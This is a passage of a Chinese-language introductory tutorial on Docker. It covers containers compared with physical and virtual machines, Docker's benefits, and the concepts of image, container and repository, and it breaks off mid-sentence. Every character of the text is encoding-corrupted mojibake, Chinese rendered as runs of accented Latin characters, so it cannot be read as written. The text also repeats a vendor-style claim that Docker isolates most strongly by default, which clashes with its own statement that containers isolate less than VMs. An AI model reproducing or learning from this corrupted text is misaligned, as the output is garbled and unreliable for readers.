æ˜¯ä¸–ç•Œé¢†å…ˆçš„è½¯ä»¶å®¹å™¨å¹³å°ï¼Œæ‰€ä»¥æƒ³è¦æžæ‡‚Dockerçš„æ¦‚å¿µæˆ‘ä»¬å¿…é¡»å…ˆä»Žå®¹å™¨å¼€å§‹è¯´èµ·ã€‚ å…ˆä»Žè®¤è¯†å®¹å™¨å¼€å§‹ä»€ä¹ˆæ˜¯å®¹å™¨?å…ˆæ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºå®˜æ–¹çš„è§£é‡Šä¸€å¥è¯æ¦‚æ‹¬å®¹å™¨ï¼šå®¹å™¨å°±æ˜¯å°†è½¯ä»¶æ‰“åŒ…æˆæ ‡å‡†åŒ–å•å…ƒï¼Œä»¥ç”¨äºŽå¼€å‘ã€äº¤ä»˜å’Œéƒ¨ç½²ã€‚ å®¹å™¨é•œåƒæ˜¯è½»é‡çš„ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ… ï¼ŒåŒ…å«è½¯ä»¶è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼šä»£ç ã€è¿è¡Œæ—¶çŽ¯å¢ƒã€ç³»ç»Ÿå·¥å…·ã€ç³»ç»Ÿåº“å’Œè®¾ç½®ã€‚ å®¹å™¨åŒ–è½¯ä»¶é€‚ç”¨äºŽåŸºäºŽLinuxå’ŒWindowsçš„åº”ç”¨ï¼Œåœ¨ä»»ä½•çŽ¯å¢ƒä¸­éƒ½èƒ½å¤Ÿå§‹ç»ˆå¦‚ä¸€åœ°è¿è¡Œã€‚ å®¹å™¨èµ‹äºˆäº†è½¯ä»¶ç‹¬ç«‹æ€§ ï¼Œä½¿å…¶å…å—å¤–åœ¨çŽ¯å¢ƒå·®å¼‚ï¼ˆä¾‹å¦‚ï¼Œå¼€å‘å’Œé¢„æ¼”çŽ¯å¢ƒçš„å·®å¼‚ï¼‰çš„å½±å“ï¼Œä»Žè€Œæœ‰åŠ©äºŽå‡å°‘å›¢é˜Ÿé—´åœ¨ç›¸åŒåŸºç¡€è®¾æ–½ä¸Šè¿è¡Œä¸åŒè½¯ä»¶æ—¶çš„å†²çªã€‚ å†æ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºé€šä¿—çš„è§£é‡Šå¦‚æžœéœ€è¦é€šä¿—çš„æè¿°å®¹å™¨çš„è¯ï¼Œæˆ‘è§‰å¾—å®¹å™¨å°±æ˜¯ä¸€ä¸ªå­˜æ”¾ä¸œè¥¿çš„åœ°æ–¹ï¼Œå°±åƒä¹¦åŒ…å¯ä»¥è£…å„ç§æ–‡å…·ã€è¡£æŸœå¯ä»¥æ”¾å„ç§è¡£æœã€éž‹æž¶å¯ä»¥æ”¾å„ç§éž‹å­ä¸€æ ·ã€‚æˆ‘ä»¬çŽ°åœ¨æ‰€è¯´çš„å®¹å™¨å­˜æ”¾çš„ä¸œè¥¿å¯èƒ½æ›´åå‘äºŽåº”ç”¨æ¯”å¦‚ç½‘ç«™ã€ç¨‹åºç”šè‡³æ˜¯ç³»ç»ŸçŽ¯å¢ƒã€‚ å›¾è§£ç‰©ç†æœº,è™šæ‹Ÿæœºä¸Žå®¹å™¨å…³äºŽè™šæ‹Ÿæœºä¸Žå®¹å™¨çš„å¯¹æ¯”åœ¨åŽé¢ä¼šè¯¦ç»†ä»‹ç»åˆ°ï¼Œè¿™é‡Œåªæ˜¯é€šè¿‡ç½‘ä¸Šçš„å›¾ç‰‡åŠ æ·±å¤§å®¶å¯¹äºŽç‰©ç†æœºã€è™šæ‹Ÿæœºä¸Žå®¹å™¨è¿™ä¸‰è€…çš„ç†è§£ã€‚ ç‰©ç†æœº è™šæ‹Ÿæœºï¼š å®¹å™¨ï¼š é€šè¿‡ä¸Šé¢è¿™ä¸‰å¼ æŠ½è±¡å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å¤§æ¦‚å¯ä»¥é€šè¿‡ç±»æ¯”æ¦‚æ‹¬å‡ºï¼š å®¹å™¨è™šæ‹ŸåŒ–çš„æ˜¯æ“ä½œç³»ç»Ÿè€Œä¸æ˜¯ç¡¬ä»¶ï¼Œå®¹å™¨ä¹‹é—´æ˜¯å…±äº«åŒä¸€å¥—æ“ä½œç³»ç»Ÿèµ„æºçš„ã€‚è™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åŽï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿã€‚å› æ­¤å®¹å™¨çš„éš”ç¦»çº§åˆ«ä¼šç¨ä½Žä¸€äº›ã€‚ ç›¸ä¿¡é€šè¿‡ä¸Šé¢çš„è§£é‡Šå¤§å®¶å¯¹äºŽå®¹å™¨è¿™ä¸ªæ—¢é™Œç”Ÿåˆç†Ÿæ‚‰çš„æ¦‚å¿µæœ‰äº†ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥è°ˆè°ˆDockerçš„ä¸€äº›æ¦‚å¿µã€‚ å†æ¥è°ˆè°ˆ Docker çš„ä¸€äº›æ¦‚å¿µ ä»€ä¹ˆæ˜¯ Docker?è¯´å®žè¯å…³äºŽDockeræ˜¯ä»€ä¹ˆå¹¶å¤ªå¥½è¯´ï¼Œä¸‹é¢æˆ‘é€šè¿‡å››ç‚¹å‘ä½ è¯´æ˜ŽDockeråˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ã€‚ Docker æ˜¯ä¸–ç•Œé¢†å…ˆçš„è½¯ä»¶å®¹å™¨å¹³å°ã€‚ Docker ä½¿ç”¨ Google å…¬å¸æŽ¨å‡ºçš„ Go è¯­è¨€ è¿›è¡Œå¼€å‘å®žçŽ°ï¼ŒåŸºäºŽ Linux å†…æ ¸ çš„cgroupï¼Œnamespaceï¼Œä»¥åŠAUFSç±»çš„UnionFSç­‰æŠ€æœ¯ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œå°è£…éš”ç¦»ï¼Œå±žäºŽæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ ç”±äºŽéš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºŽå®¿ä¸»å’Œå…¶å®ƒçš„éš”ç¦»çš„è¿›ç¨‹ï¼Œå› æ­¤ä¹Ÿç§°å…¶ä¸ºå®¹å™¨ã€‚Dockeæœ€åˆå®žçŽ°æ˜¯åŸºäºŽ LXC. Docker èƒ½å¤Ÿè‡ªåŠ¨æ‰§è¡Œé‡å¤æ€§ä»»åŠ¡ï¼Œä¾‹å¦‚æ­å»ºå’Œé…ç½®å¼€å‘çŽ¯å¢ƒï¼Œä»Žè€Œè§£æ”¾äº†å¼€å‘äººå‘˜ä»¥ä¾¿ä»–ä»¬ä¸“æ³¨åœ¨çœŸæ­£é‡è¦çš„äº‹æƒ…ä¸Šï¼šæž„å»ºæ°å‡ºçš„è½¯ä»¶ã€‚ ç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°åˆ›å»ºå’Œä½¿ç”¨å®¹å™¨ï¼ŒæŠŠè‡ªå·±çš„åº”ç”¨æ”¾å…¥å®¹å™¨ã€‚å®¹å™¨è¿˜å¯ä»¥è¿›è¡Œç‰ˆæœ¬ç®¡ç†ã€å¤åˆ¶ã€åˆ†äº«ã€ä¿®æ”¹ï¼Œå°±åƒç®¡ç†æ™®é€šçš„ä»£ç ä¸€æ ·ã€‚ Docker æ€æƒ³ é›†è£…ç®± æ ‡å‡†åŒ–ï¼š â‘ è¿è¾“æ–¹å¼ â‘¡ å­˜å‚¨æ–¹å¼ â‘¢ APIæŽ¥å£ éš”ç¦» Docker å®¹å™¨çš„ç‰¹ç‚¹ è½»é‡åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œçš„å¤šä¸ª Docker å®¹å™¨å¯ä»¥å…±äº«è¿™å°æœºå™¨çš„æ“ä½œç³»ç»Ÿå†…æ ¸ï¼›å®ƒä»¬èƒ½å¤Ÿè¿…é€Ÿå¯åŠ¨ï¼Œåªéœ€å ç”¨å¾ˆå°‘çš„è®¡ç®—å’Œå†…å­˜èµ„æºã€‚é•œåƒæ˜¯é€šè¿‡æ–‡ä»¶ç³»ç»Ÿå±‚è¿›è¡Œæž„é€ çš„ï¼Œå¹¶å…±äº«ä¸€äº›å…¬å…±æ–‡ä»¶ã€‚è¿™æ ·å°±èƒ½å°½é‡é™ä½Žç£ç›˜ç”¨é‡ï¼Œå¹¶èƒ½æ›´å¿«åœ°ä¸‹è½½é•œåƒã€‚ æ ‡å‡†Docker å®¹å™¨åŸºäºŽå¼€æ”¾å¼æ ‡å‡†ï¼Œèƒ½å¤Ÿåœ¨æ‰€æœ‰ä¸»æµ Linux ç‰ˆæœ¬ã€Microsoft Windows ä»¥åŠåŒ…æ‹¬ VMã€è£¸æœºæœåŠ¡å™¨å’Œäº‘åœ¨å†…çš„ä»»ä½•åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œã€‚ å®‰å…¨Docker èµ‹äºˆåº”ç”¨çš„éš”ç¦»æ€§ä¸ä»…é™äºŽå½¼æ­¤éš”ç¦»ï¼Œè¿˜ç‹¬ç«‹äºŽåº•å±‚çš„åŸºç¡€è®¾æ–½ã€‚Docker é»˜è®¤æä¾›æœ€å¼ºçš„éš”ç¦»ï¼Œå› æ­¤åº”ç”¨å‡ºçŽ°é—®é¢˜ï¼Œä¹Ÿåªæ˜¯å•ä¸ªå®¹å™¨çš„é—®é¢˜ï¼Œè€Œä¸ä¼šæ³¢åŠåˆ°æ•´å°æœºå™¨ã€‚ ä¸ºä»€ä¹ˆè¦ç”¨ Docker ? Docker çš„é•œåƒæä¾›äº†é™¤å†…æ ¸å¤–å®Œæ•´çš„è¿è¡Œæ—¶çŽ¯å¢ƒï¼Œç¡®ä¿äº†åº”ç”¨è¿è¡ŒçŽ¯å¢ƒä¸€è‡´æ€§ï¼Œä»Žè€Œä¸ä¼šå†å‡ºçŽ° â€œè¿™æ®µä»£ç åœ¨æˆ‘æœºå™¨ä¸Šæ²¡é—®é¢˜å•Šâ€ è¿™ç±»é—®é¢˜ï¼›â€”â€”ä¸€è‡´çš„è¿è¡ŒçŽ¯å¢ƒ å¯ä»¥åšåˆ°ç§’çº§ã€ç”šè‡³æ¯«ç§’çº§çš„å¯åŠ¨æ—¶é—´ã€‚å¤§å¤§çš„èŠ‚çº¦äº†å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²çš„æ—¶é—´ã€‚â€”â€”æ›´å¿«é€Ÿçš„å¯åŠ¨æ—¶é—´ é¿å…å…¬ç”¨çš„æœåŠ¡å™¨ï¼Œèµ„æºä¼šå®¹æ˜“å—åˆ°å…¶ä»–ç”¨æˆ·çš„å½±å“ã€‚â€”â€”éš”ç¦»æ€§ å–„äºŽå¤„ç†é›†ä¸­çˆ†å‘çš„æœåŠ¡å™¨ä½¿ç”¨åŽ‹åŠ›ï¼›â€”â€”å¼¹æ€§ä¼¸ç¼©ï¼Œå¿«é€Ÿæ‰©å±• å¯ä»¥å¾ˆè½»æ˜“çš„å°†åœ¨ä¸€ä¸ªå¹³å°ä¸Šè¿è¡Œçš„åº”ç”¨ï¼Œè¿ç§»åˆ°å¦ä¸€ä¸ªå¹³å°ä¸Šï¼Œè€Œä¸ç”¨æ‹…å¿ƒè¿è¡ŒçŽ¯å¢ƒçš„å˜åŒ–å¯¼è‡´åº”ç”¨æ— æ³•æ­£å¸¸è¿è¡Œçš„æƒ…å†µã€‚â€”â€”è¿ç§»æ–¹ä¾¿ ä½¿ç”¨ Docker å¯ä»¥é€šè¿‡å®šåˆ¶åº”ç”¨é•œåƒæ¥å®žçŽ°æŒç»­é›†æˆã€æŒç»­äº¤ä»˜ã€éƒ¨ç½²ã€‚â€”â€”æŒç»­äº¤ä»˜å’Œéƒ¨ç½² æ¯å½“è¯´èµ·å®¹å™¨ï¼Œæˆ‘ä»¬ä¸å¾—ä¸å°†å…¶ä¸Žè™šæ‹Ÿæœºåšä¸€ä¸ªæ¯”è¾ƒã€‚å°±æˆ‘è€Œè¨€ï¼Œå¯¹äºŽä¸¤è€…æ— æ‰€è°“è°ä¼šå–ä»£è°ï¼Œè€Œæ˜¯ä¸¤è€…å¯ä»¥å’Œè°å…±å­˜ã€‚ å®¹å™¨ VS è™šæ‹Ÿæœº ç®€å•æ¥è¯´ï¼š å®¹å™¨å’Œè™šæ‹Ÿæœºå…·æœ‰ç›¸ä¼¼çš„èµ„æºéš”ç¦»å’Œåˆ†é…ä¼˜åŠ¿ï¼Œä½†åŠŸèƒ½æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºå®¹å™¨è™šæ‹ŸåŒ–çš„æ˜¯æ“ä½œç³»ç»Ÿï¼Œè€Œä¸æ˜¯ç¡¬ä»¶ï¼Œå› æ­¤å®¹å™¨æ›´å®¹æ˜“ç§»æ¤ï¼Œæ•ˆçŽ‡ä¹Ÿæ›´é«˜ã€‚ ä¸¤è€…å¯¹æ¯”å›¾ ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åŽï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ï¼›è€Œå®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æŽ¥è¿è¡ŒäºŽå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿. å®¹å™¨ä¸Žè™šæ‹Ÿæœºæ€»ç»“ å®¹å™¨æ˜¯ä¸€ä¸ªåº”ç”¨å±‚æŠ½è±¡ï¼Œç”¨äºŽå°†ä»£ç å’Œä¾èµ–èµ„æºæ‰“åŒ…åœ¨ä¸€èµ·ã€‚ å¤šä¸ªå®¹å™¨å¯ä»¥åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œï¼Œå…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œä½†å„è‡ªä½œä¸ºç‹¬ç«‹çš„è¿›ç¨‹åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œ ã€‚ä¸Žè™šæ‹Ÿæœºç›¸æ¯”ï¼Œ å®¹å™¨å ç”¨çš„ç©ºé—´è¾ƒå°‘ï¼ˆå®¹å™¨é•œåƒå¤§å°é€šå¸¸åªæœ‰å‡ åå…†ï¼‰ï¼Œçž¬é—´å°±èƒ½å®Œæˆå¯åŠ¨ ã€‚ è™šæ‹Ÿæœº (VM) æ˜¯ä¸€ä¸ªç‰©ç†ç¡¬ä»¶å±‚æŠ½è±¡ï¼Œç”¨äºŽå°†ä¸€å°æœåŠ¡å™¨å˜æˆå¤šå°æœåŠ¡å™¨ã€‚ ç®¡ç†ç¨‹åºå…è®¸å¤šä¸ª VM åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œã€‚æ¯ä¸ªVMéƒ½åŒ…å«ä¸€æ•´å¥—æ“ä½œç³»ç»Ÿã€ä¸€ä¸ªæˆ–å¤šä¸ªåº”ç”¨ã€å¿…è¦çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œåº“èµ„æºï¼Œå› æ­¤ å ç”¨å¤§é‡ç©ºé—´ ã€‚è€Œä¸” VM å¯åŠ¨ä¹Ÿååˆ†ç¼“æ…¢ ã€‚ é€šè¿‡Dockerå®˜ç½‘ï¼Œæˆ‘ä»¬çŸ¥é“äº†è¿™ä¹ˆå¤šDockerçš„ä¼˜åŠ¿ï¼Œä½†æ˜¯å¤§å®¶ä¹Ÿæ²¡æœ‰å¿…è¦å®Œå…¨å¦å®šè™šæ‹ŸæœºæŠ€æœ¯ï¼Œå› ä¸ºä¸¤è€…æœ‰ä¸åŒçš„ä½¿ç”¨åœºæ™¯ã€‚è™šæ‹Ÿæœºæ›´æ“…é•¿äºŽå½»åº•éš”ç¦»æ•´ä¸ªè¿è¡ŒçŽ¯å¢ƒã€‚ä¾‹å¦‚ï¼Œäº‘æœåŠ¡æä¾›å•†é€šå¸¸é‡‡ç”¨è™šæ‹ŸæœºæŠ€æœ¯éš”ç¦»ä¸åŒçš„ç”¨æˆ·ã€‚è€Œ Dockeré€šå¸¸ç”¨äºŽéš”ç¦»ä¸åŒçš„åº”ç”¨ ï¼Œä¾‹å¦‚å‰ç«¯ï¼ŒåŽç«¯ä»¥åŠæ•°æ®åº“ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸€å°ä¸»æœºä¸Šã€‚ç”¨æˆ·å¹¶ä¸ç›´æŽ¥å’Œå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œè€Œæ˜¯é€šè¿‡ Docker å®¢æˆ·ç«¯é—´æŽ¥å’Œå…¶é€šä¿¡ã€‚Docker å®¢æˆ·ç«¯ï¼Œå®žé™…ä¸Šæ˜¯ docker çš„äºŒè¿›åˆ¶ç¨‹åºï¼Œæ˜¯ä¸»è¦çš„ç”¨æˆ·ä¸Ž Docker äº¤äº’æ–¹å¼ã€‚å®ƒæŽ¥æ”¶ç”¨æˆ·æŒ‡ä»¤å¹¶ä¸”ä¸ŽèƒŒåŽçš„ Docker å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ï¼Œå¦‚æ­¤æ¥å›žå¾€å¤ã€‚ å®¹å™¨ä¸Žè™šæ‹Ÿæœºä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„å°±æˆ‘è€Œè¨€ï¼Œå¯¹äºŽä¸¤è€…æ— æ‰€è°“è°ä¼šå–ä»£è°ï¼Œè€Œæ˜¯ä¸¤è€…å¯ä»¥å’Œè°å…±å­˜ã€‚ Dockerä¸­éžå¸¸é‡è¦çš„ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µï¼Œç†è§£äº†è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå°±ç†è§£äº† Docker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚ DockeråŸºæœ¬æ¦‚å¿µDocker åŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ é•œåƒï¼ˆImageï¼‰ å®¹å™¨ï¼ˆContainerï¼‰ ä»“åº“ï¼ˆRepositoryï¼‰ ç†è§£äº†è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå°±ç†è§£äº† Docker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸ é•œåƒ(Image):ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿ æ“ä½œç³»ç»Ÿåˆ†ä¸ºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´ã€‚å¯¹äºŽ Linux è€Œè¨€ï¼Œå†…æ ¸å¯åŠ¨åŽï¼Œä¼šæŒ‚è½½ root æ–‡ä»¶ç³»ç»Ÿä¸ºå…¶æä¾›ç”¨æˆ·ç©ºé—´æ”¯æŒã€‚è€ŒDocker é•œåƒï¼ˆImageï¼‰ï¼Œå°±ç›¸å½“äºŽæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚ Docker é•œåƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€çŽ¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚ é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æž„å»ºä¹‹åŽä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚ é•œåƒï¼ˆImageï¼‰å°±æ˜¯ä¸€å †åªè¯»å±‚ï¼ˆread-only layerï¼‰çš„ç»Ÿä¸€è§†è§’ï¼Œä¹Ÿè®¸è¿™ä¸ªå®šä¹‰æœ‰äº›éš¾ä»¥ç†è§£ï¼Œä¸‹é¢çš„è¿™å¼ å›¾èƒ½å¤Ÿå¸®åŠ©è¯»è€…ç†è§£é•œåƒçš„å®šä¹‰ã€‚ ä»Žå·¦è¾¹æˆ‘ä»¬çœ‹åˆ°äº†å¤šä¸ªåªè¯»å±‚ï¼Œå®ƒä»¬é‡å åœ¨ä¸€èµ·ã€‚é™¤äº†æœ€ä¸‹é¢ä¸€å±‚ï¼Œå…¶å®ƒå±‚éƒ½ä¼šæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€å±‚ã€‚è¿™äº›å±‚æ˜¯Docker å†…éƒ¨çš„å®žçŽ°ç»†èŠ‚ï¼Œå¹¶ä¸”èƒ½å¤Ÿåœ¨ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿä¸Šè®¿é—®åˆ°ã€‚ç»Ÿä¸€æ–‡ä»¶ç³»ç»Ÿ (union file system) æŠ€æœ¯èƒ½å¤Ÿå°†ä¸åŒçš„å±‚æ•´åˆæˆä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¿™äº›å±‚æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„è§†è§’ï¼Œè¿™æ ·å°±éšè—äº†å¤šå±‚çš„å­˜åœ¨ï¼Œåœ¨ç”¨æˆ·çš„è§’åº¦çœ‹æ¥ï¼Œåªå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚æˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡çš„å³è¾¹çœ‹åˆ°è¿™ä¸ªè§†è§’çš„å½¢å¼ã€‚ Docker è®¾è®¡æ—¶ï¼Œå°±å……åˆ†åˆ©ç”¨ Union FSçš„æŠ€æœ¯ï¼Œå°†å…¶è®¾è®¡ä¸º åˆ†å±‚å­˜å‚¨çš„æž¶æž„ ã€‚ é•œåƒå®žé™…æ˜¯ç”±å¤šå±‚æ–‡ä»¶ç³»ç»Ÿè”åˆç»„æˆã€‚ é•œåƒæž„å»ºæ—¶ï¼Œä¼šä¸€å±‚å±‚æž„å»ºï¼Œå‰ä¸€å±‚æ˜¯åŽä¸€å±‚çš„åŸºç¡€ã€‚æ¯ä¸€å±‚æž„å»ºå®Œå°±ä¸ä¼šå†å‘ç”Ÿæ”¹å˜ï¼ŒåŽä¸€å±‚ä¸Šçš„ä»»ä½•æ”¹å˜åªå‘ç”Ÿåœ¨è‡ªå·±è¿™ä¸€å±‚ã€‚ æ¯”å¦‚ï¼Œåˆ é™¤å‰ä¸€å±‚æ–‡ä»¶çš„æ“ä½œï¼Œå®žé™…ä¸æ˜¯çœŸçš„åˆ é™¤å‰ä¸€å±‚çš„æ–‡ä»¶ï¼Œè€Œæ˜¯ä»…åœ¨å½“å‰å±‚æ ‡è®°ä¸ºè¯¥æ–‡ä»¶å·²åˆ é™¤ã€‚åœ¨æœ€ç»ˆå®¹å™¨è¿è¡Œçš„æ—¶å€™ï¼Œè™½ç„¶ä¸ä¼šçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å®žé™…ä¸Šè¯¥æ–‡ä»¶ä¼šä¸€ç›´è·Ÿéšé•œåƒã€‚å› æ­¤ï¼Œåœ¨æž„å»ºé•œåƒçš„æ—¶å€™ï¼Œéœ€è¦é¢å¤–å°å¿ƒï¼Œæ¯ä¸€å±‚å°½é‡åªåŒ…å«è¯¥å±‚éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•é¢å¤–çš„ä¸œè¥¿åº”è¯¥åœ¨è¯¥å±‚æž„å»ºç»“æŸå‰æ¸…ç†æŽ‰ã€‚ åˆ†å±‚å­˜å‚¨çš„ç‰¹å¾è¿˜ä½¿å¾—é•œåƒçš„å¤ç”¨ã€å®šåˆ¶å˜çš„æ›´ä¸ºå®¹æ˜“ã€‚ç”šè‡³å¯ä»¥ç”¨ä¹‹å‰æž„å»ºå¥½çš„é•œåƒä½œä¸ºåŸºç¡€å±‚ï¼Œç„¶åŽè¿›ä¸€æ­¥æ·»åŠ æ–°çš„å±‚ï¼Œä»¥å®šåˆ¶è‡ªå·±æ‰€éœ€çš„å†…å®¹ï¼Œæž„å»ºæ–°çš„é•œåƒã€‚ å®¹å™¨(Container):é•œåƒè¿è¡Œæ—¶çš„å®žä½“ é•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ ç±» å’Œ å®žä¾‹ ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®žä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ ã€‚ å®¹å™¨çš„å®žè´¨æ˜¯è¿›ç¨‹ï¼Œä½†ä¸Žç›´æŽ¥åœ¨å®¿ä¸»æ‰§è¡Œçš„è¿›ç¨‹ä¸åŒï¼Œå®¹å™¨è¿›ç¨‹è¿è¡ŒäºŽå±žäºŽè‡ªå·±çš„ç‹¬ç«‹çš„ å‘½åç©ºé—´ã€‚å‰é¢è®²è¿‡é•œåƒä½¿ç”¨çš„æ˜¯åˆ†å±‚å­˜å‚¨ï¼Œå®¹å™¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ å®¹å™¨å­˜å‚¨å±‚çš„ç”Ÿå­˜å‘¨æœŸå’Œå®¹å™¨ä¸€æ ·ï¼Œå®¹å™¨æ¶ˆäº¡æ—¶ï¼Œå®¹å™¨å­˜å‚¨å±‚ä¹Ÿéšä¹‹æ¶ˆäº¡ã€‚å› æ­¤ï¼Œä»»ä½•ä¿å­˜äºŽå®¹å™¨å­˜å‚¨å±‚çš„ä¿¡æ¯éƒ½ä¼šéšå®¹å™¨åˆ é™¤è€Œä¸¢å¤±ã€‚ æŒ‰ç…§ Docker æœ€ä½³å®žè·µçš„è¦æ±‚ï¼Œå®¹å™¨ä¸åº”è¯¥å‘å…¶å­˜å‚¨å±‚å†…å†™å…¥ä»»ä½•æ•°æ® ï¼Œå®¹å™¨å­˜å‚¨å±‚è¦ä¿æŒæ— çŠ¶æ€åŒ–ã€‚æ‰€æœ‰çš„æ–‡ä»¶å†™å…¥æ“ä½œï¼Œéƒ½åº”è¯¥ä½¿ç”¨æ•°æ®å·ï¼ˆVolumeï¼‰ã€æˆ–è€…ç»‘å®šå®¿ä¸»ç›®å½•ï¼Œåœ¨è¿™äº›ä½ç½®çš„è¯»å†™ä¼šè·³è¿‡å®¹å™¨å­˜å‚¨å±‚ï¼Œç›´æŽ¥å¯¹å®¿ä¸»(æˆ–ç½‘ç»œå­˜å‚¨)å‘ç”Ÿè¯»å†™ï¼Œå…¶æ€§èƒ½å’Œç¨³å®šæ€§æ›´é«˜ã€‚æ•°æ®å·çš„ç”Ÿå­˜å‘¨æœŸç‹¬ç«‹äºŽå®¹å™¨ï¼Œå®¹å™¨æ¶ˆäº¡ï¼Œæ•°æ®å·ä¸ä¼šæ¶ˆäº¡ã€‚å› æ­¤ï¼Œ ä½¿ç”¨æ•°æ®å·åŽï¼Œå®¹å™¨å¯ä»¥éšæ„åˆ é™¤ã€é‡æ–° run ï¼Œæ•°æ®å´ä¸ä¼šä¸¢å¤±ã€‚ ä»“åº“(Repository):é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹ é•œåƒæž„å»ºå®ŒæˆåŽï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„åœ¨å½“å‰å®¿ä¸»ä¸Šè¿è¡Œï¼Œä½†æ˜¯ï¼Œ å¦‚æžœéœ€è¦åœ¨å…¶å®ƒæœåŠ¡å™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªé›†ä¸­çš„å­˜å‚¨ã€åˆ†å‘é•œåƒçš„æœåŠ¡ï¼ŒDocker Registryå°±æ˜¯è¿™æ ·çš„æœåŠ¡ã€‚ ä¸€ä¸ª Docker Registryä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆRepositoryï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼›æ¯ä¸ªæ 